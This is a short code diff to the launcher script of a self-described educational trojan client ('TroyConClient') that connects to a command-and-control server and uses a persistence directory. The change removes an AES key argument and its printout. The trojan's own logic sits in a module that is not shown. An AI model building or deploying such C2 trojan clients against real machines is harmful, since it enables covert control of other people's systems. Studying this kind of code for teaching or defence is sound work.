@@ -1,5 +1,5 @@
 from modules import TroyConClient
-from modules import  ( SERVER_IP_ADDR, SERVER_PORT_NUM, AES_ENCRYPTION_KEY,TEST_DIRECTORY ,CURRENT_SCRIPT_DIR )
+from modules import  ( SERVER_IP_ADDR, SERVER_PORT_NUM, TEST_DIRECTORY ,CURRENT_SCRIPT_DIR )
 
 # -------------------- Script Execution Entry Point --------------------
 def main():
@@ -12,11 +12,10 @@ def main():
 
     print(f"--- TrojanClient Educational Configuration ---")
     print(f"C2 Server: {SERVER_IP_ADDR}:{SERVER_PORT_NUM}")
-    print(f"AES Key: {AES_ENCRYPTION_KEY.hex()} (Hex)")
     print(f"Working Directory: {TEST_DIRECTORY}")
     print(f"-----------------------------------------------")
 
-    TroyCon = TroyConClient(SERVER_IP_ADDR, SERVER_PORT_NUM, AES_ENCRYPTION_KEY,
+    TroyCon = TroyConClient(SERVER_IP_ADDR, SERVER_PORT_NUM,
                           test_dir=TEST_DIRECTORY, persistence_dir=TEST_DIRECTORY)
     TroyCon.start_client()
 
